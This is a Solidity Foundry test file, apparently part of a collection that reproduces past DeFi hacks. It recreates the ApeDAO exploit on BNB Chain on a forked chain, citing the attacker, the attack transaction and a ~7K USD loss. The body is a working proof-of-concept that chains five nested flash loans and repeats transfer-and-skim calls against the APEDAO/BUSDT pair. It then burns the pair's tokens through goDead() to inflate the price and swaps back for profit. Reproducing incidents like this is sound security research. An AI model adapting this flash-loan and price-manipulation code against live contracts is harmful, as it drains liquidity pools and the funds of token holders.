// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";

import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
// @KeyInfo - Total Lost : ~7K USD$
// Attacker : https://bscscan.com/address/0x10703f7114dce7beaf8d23cde4bf72130bb0f56a
// Attack Contract : https://bscscan.com/address/0x45aa258ad08eeeb841c1c02eca7658f9dd4779c0
// Vulnerable Contract : https://bscscan.com/address/0xb47955b5b7eaf49c815ebc389850eb576c460092
// Attack Tx : https://bscscan.com/tx/0x8d35dfd9968ce61fb969ffe8dcc29eeeae864e466d2cb0b7d26ce63644691994

// @Analysis
// https://twitter.com/BeosinAlert/status/1681316257034035201

interface IAPEDAO is IERC20 {

    function goDead() external;

}

contract ApeDAOTest is Test {

    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAPEDAO APEDAO = IAPEDAO(0xB47955B5B7EAF49C815EBc389850eb576C460092);
    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IUniswapV2Pair Pair = IUniswapV2Pair(0xee2a9D05B943C1F33f3920C750Ac88F74D0220c3);

    function setUp() public {
        vm.createSelectFork("bsc", 30_072_293);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(APEDAO), "APEDAO");
        vm.label(address(DPPOracle1), "DPPOracle1");
        vm.label(address(DPPOracle2), "DPPOracle2");
        vm.label(address(DPPOracle3), "DPPOracle3");
        vm.label(address(DPP), "DPP");
        vm.label(address(DPPAdvanced), "DPPAdvanced");
        vm.label(address(Router), "Router");
        vm.label(address(Pair), "Pair");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "BUSDT balance of attacker before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
        emit log_named_decimal_uint(
            "BUSDT balance of attacker after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPAdvanced)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else {
            BUSDT.approve(address(Router), type(uint256).max);

            swapBUSDTToAPEDAO();
            for (uint256 i; i < 16; i++) {
                // Transfer APEDAO to Pair contract and use skim function to withdraw the excess tokens
                APEDAO.transfer(address(Pair), APEDAO.balanceOf(address(this)));
                Pair.skim(address(this));
            }
            // Burn APEDAO tokens in Pair contract (cause the token price to rise)
            APEDAO.goDead();

            BUSDT.transfer(address(Pair), 1001);
            uint256 amountIn = APEDAO.balanceOf(address(this));
            APEDAO.transfer(address(Pair), APEDAO.balanceOf(address(this)));
            swapAPEDAOToBUSDT(amountIn);
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function swapBUSDTToAPEDAO() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(APEDAO);
        Router.swapExactTokensForTokens(19_000 * 1e18, 0, path, address(this), block.timestamp + 100);
    }

    function swapAPEDAOToBUSDT(uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = address(APEDAO);
        path[1] = address(BUSDT);
        uint256[] memory amounts = Router.getAmountsOut(amountIn, path);
        Pair.swap(amounts[1], 0, address(this), bytes(""));
    }

}
